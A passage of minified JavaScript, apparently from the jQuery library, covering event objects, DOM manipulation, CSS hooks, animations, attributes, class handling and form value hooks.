0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},k.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},k.Event=function(e,t){if(!(this instanceof k.Event))return new k.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?ke:Se,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&k.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[k.expando]=!0},k.Event.prototype={constructor:k.Event,isDefaultPrevented:Se,isPropagationStopped:Se,isImmediatePropagationStopped:Se,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=ke,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=ke,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=ke,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},k.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&Te.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&Ce.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},k.event.addProp),k.each({focus:"focusin",blur:"focusout"},function(e,t){k.event.special[e]={setup:function(){return De(this,e,Ne),!1},trigger:function(){return De(this,e),!0},delegateType:t}}),k.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,i){k.event.special[e]={delegateType:i,bindType:i,handle:function(e){var t,n=e.relatedTarget,r=e.handleObj;return n&&(n===this||k.contains(this,n))||(e.type=r.origType,t=r.handler.apply(this,arguments),e.type=i),t}}}),k.fn.extend({on:function(e,t,n,r){return Ae(this,e,t,n,r)},one:function(e,t,n,r){return Ae(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,k(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=Se),this.each(function(){k.event.remove(this,e,n,t)})}});var je=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,qe=/<script|<style|<link/i,Le=/checked\s*(?:[^=]|=\s*.checked.)/i,He=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function Oe(e,t){return A(e,"table")&&A(11!==t.nodeType?t:t.firstChild,"tr")&&k(e).children("tbody")[0]||e}function Pe(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function Re(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Me(e,t){var n,r,i,o,a,s,u,l;if(1===t.nodeType){if(Q.hasData(e)&&(o=Q.access(e),a=Q.set(t,o),l=o.events))for(i in delete a.handle,a.events={},l)for(n=0,r=l[i].length;n<r;n++)k.event.add(t,i,l[i][n]);J.hasData(e)&&(s=J.access(e),u=k.extend({},s),J.set(t,u))}}function Ie(n,r,i,o){r=g.apply([],r);var e,t,a,s,u,l,c=0,f=n.length,p=f-1,d=r[0],h=m(d);if(h||1<f&&"string"==typeof d&&!y.checkClone&&Le.test(d))return n.each(function(e){var t=n.eq(e);h&&(r[0]=d.call(this,e,t.html())),Ie(t,r,i,o)});if(f&&(t=(e=we(r,n[0].ownerDocument,!1,n,o)).firstChild,1===e.childNodes.length&&(e=t),t||o)){for(s=(a=k.map(ve(e,"script"),Pe)).length;c<f;c++)u=e,c!==p&&(u=k.clone(u,!0,!0),s&&k.merge(a,ve(u,"script"))),i.call(n[c],u,c);if(s)for(l=a[a.length-1].ownerDocument,k.map(a,Re),c=0;c<s;c++)u=a[c],he.test(u.type||"")&&!Q.access(u,"globalEval")&&k.contains(l,u)&&(u.src&&"module"!==(u.type||"").toLowerCase()?k._evalUrl&&!u.noModule&&k._evalUrl(u.src,{nonce:u.nonce||u.getAttribute("nonce")}):b(u.textContent.replace(He,""),u,l))}return n}function We(e,t,n){for(var r,i=t?k.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||k.cleanData(ve(r)),r.parentNode&&(n&&oe(r)&&ye(ve(r,"script")),r.parentNode.removeChild(r));return e}k.extend({htmlPrefilter:function(e){return e.replace(je,"<$1></$2>")},clone:function(e,t,n){var r,i,o,a,s,u,l,c=e.cloneNode(!0),f=oe(e);if(!(y.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||k.isXMLDoc(e)))for(a=ve(c),r=0,i=(o=ve(e)).length;r<i;r++)s=o[r],u=a[r],void 0,"input"===(l=u.nodeName.toLowerCase())&&pe.test(s.type)?u.checked=s.checked:"input"!==l&&"textarea"!==l||(u.defaultValue=s.defaultValue);if(t)if(n)for(o=o||ve(e),a=a||ve(c),r=0,i=o.length;r<i;r++)Me(o[r],a[r]);else Me(e,c);return 0<(a=ve(c,"script")).length&&ye(a,!f&&ve(e,"script")),c},cleanData:function(e){for(var t,n,r,i=k.event.special,o=0;void 0!==(n=e[o]);o++)if(G(n)){if(t=n[Q.expando]){if(t.events)for(r in t.events)i[r]?k.event.remove(n,r):k.removeEvent(n,r,t.handle);n[Q.expando]=void 0}n[J.expando]&&(n[J.expando]=void 0)}}}),k.fn.extend({detach:function(e){return We(this,e,!0)},remove:function(e){return We(this,e)},text:function(e){return _(this,function(e){return void 0===e?k.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return Ie(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||Oe(this,e).appendChild(e)})},prepend:function(){return Ie(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Oe(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return Ie(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return Ie(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(k.cleanData(ve(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return k.clone(this,e,t)})},html:function(e){return _(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!qe.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=k.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(k.cleanData(ve(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var n=[];return Ie(this,arguments,function(e){var t=this.parentNode;k.inArray(this,n)<0&&(k.cleanData(ve(this)),t&&t.replaceChild(e,this))},n)}}),k.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,a){k.fn[e]=function(e){for(var t,n=[],r=k(e),i=r.length-1,o=0;o<=i;o++)t=o===i?this:this.clone(!0),k(r[o])[a](t),u.apply(n,t.get());return this.pushStack(n)}});var $e=new RegExp("^("+te+")(?!px)[a-z%]+$","i"),Fe=function(e){var t=e.ownerDocument.defaultView;return t&&t.opener||(t=C),t.getComputedStyle(e)},Be=new RegExp(re.join("|"),"i");function _e(e,t,n){var r,i,o,a,s=e.style;return(n=n||Fe(e))&&(""!==(a=n.getPropertyValue(t)||n[t])||oe(e)||(a=k.style(e,t)),!y.pixelBoxStyles()&&$e.test(a)&&Be.test(t)&&(r=s.width,i=s.minWidth,o=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=r,s.minWidth=i,s.maxWidth=o)),void 0!==a?a+"":a}function ze(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}!function(){function e(){if(u){s.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",u.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",ie.appendChild(s).appendChild(u);var e=C.getComputedStyle(u);n="1%"!==e.top,a=12===t(e.marginLeft),u.style.right="60%",o=36===t(e.right),r=36===t(e.width),u.style.position="absolute",i=12===t(u.offsetWidth/3),ie.removeChild(s),u=null}}function t(e){return Math.round(parseFloat(e))}var n,r,i,o,a,s=E.createElement("div"),u=E.createElement("div");u.style&&(u.style.backgroundClip="content-box",u.cloneNode(!0).style.backgroundClip="",y.clearCloneStyle="content-box"===u.style.backgroundClip,k.extend(y,{boxSizingReliable:function(){return e(),r},pixelBoxStyles:function(){return e(),o},pixelPosition:function(){return e(),n},reliableMarginLeft:function(){return e(),a},scrollboxSize:function(){return e(),i}}))}();var Ue=["Webkit","Moz","ms"],Xe=E.createElement("div").style,Ve={};function Ge(e){var t=k.cssProps[e]||Ve[e];return t||(e in Xe?e:Ve[e]=function(e){var t=e[0].toUpperCase()+e.slice(1),n=Ue.length;while(n--)if((e=Ue[n]+t)in Xe)return e}(e)||e)}var Ye=/^(none|table(?!-c[ea]).+)/,Qe=/^--/,Je={position:"absolute",visibility:"hidden",display:"block"},Ke={letterSpacing:"0",fontWeight:"400"};function Ze(e,t,n){var r=ne.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function et(e,t,n,r,i,o){var a="width"===t?1:0,s=0,u=0;if(n===(r?"border":"content"))return 0;for(;a<4;a+=2)"margin"===n&&(u+=k.css(e,n+re[a],!0,i)),r?("content"===n&&(u-=k.css(e,"padding"+re[a],!0,i)),"margin"!==n&&(u-=k.css(e,"border"+re[a]+"Width",!0,i))):(u+=k.css(e,"padding"+re[a],!0,i),"padding"!==n?u+=k.css(e,"border"+re[a]+"Width",!0,i):s+=k.css(e,"border"+re[a]+"Width",!0,i));return!r&&0<=o&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-o-u-s-.5))||0),u}function tt(e,t,n){var r=Fe(e),i=(!y.boxSizingReliable()||n)&&"border-box"===k.css(e,"boxSizing",!1,r),o=i,a=_e(e,t,r),s="offset"+t[0].toUpperCase()+t.slice(1);if($e.test(a)){if(!n)return a;a="auto"}return(!y.boxSizingReliable()&&i||"auto"===a||!parseFloat(a)&&"inline"===k.css(e,"display",!1,r))&&e.getClientRects().length&&(i="border-box"===k.css(e,"boxSizing",!1,r),(o=s in e)&&(a=e[s])),(a=parseFloat(a)||0)+et(e,t,n||(i?"border":"content"),o,r,a)+"px"}function nt(e,t,n,r,i){return new nt.prototype.init(e,t,n,r,i)}k.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=_e(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,a,s=V(t),u=Qe.test(t),l=e.style;if(u||(t=Ge(s)),a=k.cssHooks[t]||k.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(i=a.get(e,!1,r))?i:l[t];"string"===(o=typeof n)&&(i=ne.exec(n))&&i[1]&&(n=le(e,t,i),o="number"),null!=n&&n==n&&("number"!==o||u||(n+=i&&i[3]||(k.cssNumber[s]?"":"px")),y.clearCloneStyle||""!==n||0!==t.indexOf("background")||(l[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,r))||(u?l.setProperty(t,n):l[t]=n))}},css:function(e,t,n,r){var i,o,a,s=V(t);return Qe.test(t)||(t=Ge(s)),(a=k.cssHooks[t]||k.cssHooks[s])&&"get"in a&&(i=a.get(e,!0,n)),void 0===i&&(i=_e(e,t,r)),"normal"===i&&t in Ke&&(i=Ke[t]),""===n||n?(o=parseFloat(i),!0===n||isFinite(o)?o||0:i):i}}),k.each(["height","width"],function(e,u){k.cssHooks[u]={get:function(e,t,n){if(t)return!Ye.test(k.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?tt(e,u,n):ue(e,Je,function(){return tt(e,u,n)})},set:function(e,t,n){var r,i=Fe(e),o=!y.scrollboxSize()&&"absolute"===i.position,a=(o||n)&&"border-box"===k.css(e,"boxSizing",!1,i),s=n?et(e,u,n,a,i):0;return a&&o&&(s-=Math.ceil(e["offset"+u[0].toUpperCase()+u.slice(1)]-parseFloat(i[u])-et(e,u,"border",!1,i)-.5)),s&&(r=ne.exec(t))&&"px"!==(r[3]||"px")&&(e.style[u]=t,t=k.css(e,u)),Ze(0,t,s)}}}),k.cssHooks.marginLeft=ze(y.reliableMarginLeft,function(e,t){if(t)return(parseFloat(_e(e,"marginLeft"))||e.getBoundingClientRect().left-ue(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),k.each({margin:"",padding:"",border:"Width"},function(i,o){k.cssHooks[i+o]={expand:function(e){for(var t=0,n={},r="string"==typeof e?e.split(" "):[e];t<4;t++)n[i+re[t]+o]=r[t]||r[t-2]||r[0];return n}},"margin"!==i&&(k.cssHooks[i+o].set=Ze)}),k.fn.extend({css:function(e,t){return _(this,function(e,t,n){var r,i,o={},a=0;if(Array.isArray(t)){for(r=Fe(e),i=t.length;a<i;a++)o[t[a]]=k.css(e,t[a],!1,r);return o}return void 0!==n?k.style(e,t,n):k.css(e,t)},e,t,1<arguments.length)}}),((k.Tween=nt).prototype={constructor:nt,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||k.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(k.cssNumber[n]?"":"px")},cur:function(){var e=nt.propHooks[this.prop];return e&&e.get?e.get(this):nt.propHooks._default.get(this)},run:function(e){var t,n=nt.propHooks[this.prop];return this.options.duration?this.pos=t=k.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):nt.propHooks._default.set(this),this}}).init.prototype=nt.prototype,(nt.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=k.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){k.fx.step[e.prop]?k.fx.step[e.prop](e):1!==e.elem.nodeType||!k.cssHooks[e.prop]&&null==e.elem.style[Ge(e.prop)]?e.elem[e.prop]=e.now:k.style(e.elem,e.prop,e.now+e.unit)}}}).scrollTop=nt.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},k.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},k.fx=nt.prototype.init,k.fx.step={};var rt,it,ot,at,st=/^(?:toggle|show|hide)$/,ut=/queueHooks$/;function lt(){it&&(!1===E.hidden&&C.requestAnimationFrame?C.requestAnimationFrame(lt):C.setTimeout(lt,k.fx.interval),k.fx.tick())}function ct(){return C.setTimeout(function(){rt=void 0}),rt=Date.now()}function ft(e,t){var n,r=0,i={height:e};for(t=t?1:0;r<4;r+=2-t)i["margin"+(n=re[r])]=i["padding"+n]=e;return t&&(i.opacity=i.width=e),i}function pt(e,t,n){for(var r,i=(dt.tweeners[t]||[]).concat(dt.tweeners["*"]),o=0,a=i.length;o<a;o++)if(r=i[o].call(n,t,e))return r}function dt(o,e,t){var n,a,r=0,i=dt.prefilters.length,s=k.Deferred().always(function(){delete u.elem}),u=function(){if(a)return!1;for(var e=rt||ct(),t=Math.max(0,l.startTime+l.duration-e),n=1-(t/l.duration||0),r=0,i=l.tweens.length;r<i;r++)l.tweens[r].run(n);return s.notifyWith(o,[l,n,t]),n<1&&i?t:(i||s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l]),!1)},l=s.promise({elem:o,props:k.extend({},e),opts:k.extend(!0,{specialEasing:{},easing:k.easing._default},t),originalProperties:e,originalOptions:t,startTime:rt||ct(),duration:t.duration,tweens:[],createTween:function(e,t){var n=k.Tween(o,l.opts,e,t,l.opts.specialEasing[e]||l.opts.easing);return l.tweens.push(n),n},stop:function(e){var t=0,n=e?l.tweens.length:0;if(a)return this;for(a=!0;t<n;t++)l.tweens[t].run(1);return e?(s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l,e])):s.rejectWith(o,[l,e]),this}}),c=l.props;for(!function(e,t){var n,r,i,o,a;for(n in e)if(i=t[r=V(n)],o=e[n],Array.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),(a=k.cssHooks[r])&&"expand"in a)for(n in o=a.expand(o),delete e[r],o)n in e||(e[n]=o[n],t[n]=i);else t[r]=i}(c,l.opts.specialEasing);r<i;r++)if(n=dt.prefilters[r].call(l,o,c,l.opts))return m(n.stop)&&(k._queueHooks(l.elem,l.opts.queue).stop=n.stop.bind(n)),n;return k.map(c,pt,l),m(l.opts.start)&&l.opts.start.call(o,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),k.fx.timer(k.extend(u,{elem:o,anim:l,queue:l.opts.queue})),l}k.Animation=k.extend(dt,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return le(n.elem,e,ne.exec(t),n),n}]},tweener:function(e,t){m(e)?(t=e,e=["*"]):e=e.match(R);for(var n,r=0,i=e.length;r<i;r++)n=e[r],dt.tweeners[n]=dt.tweeners[n]||[],dt.tweeners[n].unshift(t)},prefilters:[function(e,t,n){var r,i,o,a,s,u,l,c,f="width"in t||"height"in t,p=this,d={},h=e.style,g=e.nodeType&&se(e),v=Q.get(e,"fxshow");for(r in n.queue||(null==(a=k._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,k.queue(e,"fx").length||a.empty.fire()})})),t)if(i=t[r],st.test(i)){if(delete t[r],o=o||"toggle"===i,i===(g?"hide":"show")){if("show"!==i||!v||void 0===v[r])continue;g=!0}d[r]=v&&v[r]||k.style(e,r)}if((u=!k.isEmptyObject(t))||!k.isEmptyObject(d))for(r in f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(l=v&&v.display)&&(l=Q.get(e,"display")),"none"===(c=k.css(e,"display"))&&(l?c=l:(fe([e],!0),l=e.style.display||l,c=k.css(e,"display"),fe([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===k.css(e,"float")&&(u||(p.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1,d)u||(v?"hidden"in v&&(g=v.hidden):v=Q.access(e,"fxshow",{display:l}),o&&(v.hidden=!g),g&&fe([e],!0),p.done(function(){for(r in g||fe([e]),Q.remove(e,"fxshow"),d)k.style(e,r,d[r])})),u=pt(g?v[r]:0,r,p),r in v||(v[r]=u.start,g&&(u.end=u.start,u.start=0))}],prefilter:function(e,t){t?dt.prefilters.unshift(e):dt.prefilters.push(e)}}),k.speed=function(e,t,n){var r=e&&"object"==typeof e?k.extend({},e):{complete:n||!n&&t||m(e)&&e,duration:e,easing:n&&t||t&&!m(t)&&t};return k.fx.off?r.duration=0:"number"!=typeof r.duration&&(r.duration in k.fx.speeds?r.duration=k.fx.speeds[r.duration]:r.duration=k.fx.speeds._default),null!=r.queue&&!0!==r.queue||(r.queue="fx"),r.old=r.complete,r.complete=function(){m(r.old)&&r.old.call(this),r.queue&&k.dequeue(this,r.queue)},r},k.fn.extend({fadeTo:function(e,t,n,r){return this.filter(se).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(t,e,n,r){var i=k.isEmptyObject(t),o=k.speed(e,n,r),a=function(){var e=dt(this,k.extend({},t),o);(i||Q.get(this,"finish"))&&e.stop(!0)};return a.finish=a,i||!1===o.queue?this.each(a):this.queue(o.queue,a)},stop:function(i,e,o){var a=function(e){var t=e.stop;delete e.stop,t(o)};return"string"!=typeof i&&(o=e,e=i,i=void 0),e&&!1!==i&&this.queue(i||"fx",[]),this.each(function(){var e=!0,t=null!=i&&i+"queueHooks",n=k.timers,r=Q.get(this);if(t)r[t]&&r[t].stop&&a(r[t]);else for(t in r)r[t]&&r[t].stop&&ut.test(t)&&a(r[t]);for(t=n.length;t--;)n[t].elem!==this||null!=i&&n[t].queue!==i||(n[t].anim.stop(o),e=!1,n.splice(t,1));!e&&o||k.dequeue(this,i)})},finish:function(a){return!1!==a&&(a=a||"fx"),this.each(function(){var e,t=Q.get(this),n=t[a+"queue"],r=t[a+"queueHooks"],i=k.timers,o=n?n.length:0;for(t.finish=!0,k.queue(this,a,[]),r&&r.stop&&r.stop.call(this,!0),e=i.length;e--;)i[e].elem===this&&i[e].queue===a&&(i[e].anim.stop(!0),i.splice(e,1));for(e=0;e<o;e++)n[e]&&n[e].finish&&n[e].finish.call(this);delete t.finish})}}),k.each(["toggle","show","hide"],function(e,r){var i=k.fn[r];k.fn[r]=function(e,t,n){return null==e||"boolean"==typeof e?i.apply(this,arguments):this.animate(ft(r,!0),e,t,n)}}),k.each({slideDown:ft("show"),slideUp:ft("hide"),slideToggle:ft("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,r){k.fn[e]=function(e,t,n){return this.animate(r,e,t,n)}}),k.timers=[],k.fx.tick=function(){var e,t=0,n=k.timers;for(rt=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||k.fx.stop(),rt=void 0},k.fx.timer=function(e){k.timers.push(e),k.fx.start()},k.fx.interval=13,k.fx.start=function(){it||(it=!0,lt())},k.fx.stop=function(){it=null},k.fx.speeds={slow:600,fast:200,_default:400},k.fn.delay=function(r,e){return r=k.fx&&k.fx.speeds[r]||r,e=e||"fx",this.queue(e,function(e,t){var n=C.setTimeout(e,r);t.stop=function(){C.clearTimeout(n)}})},ot=E.createElement("input"),at=E.createElement("select").appendChild(E.createElement("option")),ot.type="checkbox",y.checkOn=""!==ot.value,y.optSelected=at.selected,(ot=E.createElement("input")).value="t",ot.type="radio",y.radioValue="t"===ot.value;var ht,gt=k.expr.attrHandle;k.fn.extend({attr:function(e,t){return _(this,k.attr,e,t,1<arguments.length)},removeAttr:function(e){return this.each(function(){k.removeAttr(this,e)})}}),k.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return"undefined"==typeof e.getAttribute?k.prop(e,t,n):(1===o&&k.isXMLDoc(e)||(i=k.attrHooks[t.toLowerCase()]||(k.expr.match.bool.test(t)?ht:void 0)),void 0!==n?null===n?void k.removeAttr(e,t):i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:(e.setAttribute(t,n+""),n):i&&"get"in i&&null!==(r=i.get(e,t))?r:null==(r=k.find.attr(e,t))?void 0:r)},attrHooks:{type:{set:function(e,t){if(!y.radioValue&&"radio"===t&&A(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,r=0,i=t&&t.match(R);if(i&&1===e.nodeType)while(n=i[r++])e.removeAttribute(n)}}),ht={set:function(e,t,n){return!1===t?k.removeAttr(e,n):e.setAttribute(n,n),n}},k.each(k.expr.match.bool.source.match(/\w+/g),function(e,t){var a=gt[t]||k.find.attr;gt[t]=function(e,t,n){var r,i,o=t.toLowerCase();return n||(i=gt[o],gt[o]=r,r=null!=a(e,t,n)?o:null,gt[o]=i),r}});var vt=/^(?:input|select|textarea|button)$/i,yt=/^(?:a|area)$/i;function mt(e){return(e.match(R)||[]).join(" ")}function xt(e){return e.getAttribute&&e.getAttribute("class")||""}function bt(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(R)||[]}k.fn.extend({prop:function(e,t){return _(this,k.prop,e,t,1<arguments.length)},removeProp:function(e){return this.each(function(){delete this[k.propFix[e]||e]})}}),k.extend({prop:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&k.isXMLDoc(e)||(t=k.propFix[t]||t,i=k.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){var t=k.find.attr(e,"tabindex");return t?parseInt(t,10):vt.test(e.nodeName)||yt.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),y.optSelected||(k.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),k.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){k.propFix[this.toLowerCase()]=this}),k.fn.extend({addClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){k(this).addClass(t.call(this,e,xt(this)))});if((e=bt(t)).length)while(n=this[u++])if(i=xt(n),r=1===n.nodeType&&" "+mt(i)+" "){a=0;while(o=e[a++])r.indexOf(" "+o+" ")<0&&(r+=o+" ");i!==(s=mt(r))&&n.setAttribute("class",s)}return this},removeClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){k(this).removeClass(t.call(this,e,xt(this)))});if(!arguments.length)return this.attr("class","");if((e=bt(t)).length)while(n=this[u++])if(i=xt(n),r=1===n.nodeType&&" "+mt(i)+" "){a=0;while(o=e[a++])while(-1<r.indexOf(" "+o+" "))r=r.replace(" "+o+" "," ");i!==(s=mt(r))&&n.setAttribute("class",s)}return this},toggleClass:function(i,t){var o=typeof i,a="string"===o||Array.isArray(i);return"boolean"==typeof t&&a?t?this.addClass(i):this.removeClass(i):m(i)?this.each(function(e){k(this).toggleClass(i.call(this,e,xt(this),t),t)}):this.each(function(){var e,t,n,r;if(a){t=0,n=k(this),r=bt(i);while(e=r[t++])n.hasClass(e)?n.removeClass(e):n.addClass(e)}else void 0!==i&&"boolean"!==o||((e=xt(this))&&Q.set(this,"__className__",e),this.setAttribute&&this.setAttribute("class",e||!1===i?"":Q.get(this,"__className__")||""))})},hasClass:function(e){var t,n,r=0;t=" "+e+" ";while(n=this[r++])if(1===n.nodeType&&-1<(" "+mt(xt(n))+" ").indexOf(t))return!0;return!1}});var wt=/\r/g;k.fn.extend({val:function(n){var r,e,i,t=this[0];return arguments.length?(i=m(n),this.each(function(e){var t;1===this.nodeType&&(null==(t=i?n.call(this,e,k(this).val()):n)?t="":"number"==typeof t?t+="":Array.isArray(t)&&(t=k.map(t,function(e){return null==e?"":e+""})),(r=k.valHooks[this.type]||k.valHooks[this.nodeName.toLowerCase()])&&"set"in r&&void 0!==r.set(this,t,"value")||(this.value=t))})):t?(r=k.valHooks[t.type]||k.valHooks[t.nodeName.toLowerCase()])&&"get"in r&&void 0!==(e=r.get(t,"value"))?e:"string"==typeof(e=t.value)?e.replace(wt,""):null==e?"":e:void 0}}),k.extend({valHooks:{option:{get:function(e){var t=k.find.attr(e,"value");return null!=t?t:mt(k.text(e))}},select:{get:function(e){var t,n,r,i=e.options,o=e.selectedIndex,a="select-one"===e.type,s=a?null:[],u=a?o+1:i.length;for(r=o<0?u:a?o:0;r<u;r++)if(((n=i[r]).selected||r===o)&&!n.disabled&&(!n.parentNode.disabled||!A(n.parentNode,"optgroup"))){if(t=k(n).val(),a)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=k.makeArray(t),a=i.length;while(a--)((r=i[a]).selected=-1<k.inArray(k.valHooks.option.get(r),o))&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),k.each(["radio","checkbox"],function(){k.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=-1<k.inArray(k(e).val(),t)}},y.checkOn||(k.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),y.focusin="onfocusin"in C;var Tt=/^(?:focusinfocus|focusoutblur)$/,Ct=function(e){e.stopPropagation()};k.extend(k.event,{trigger:function(e,t,n,r){var 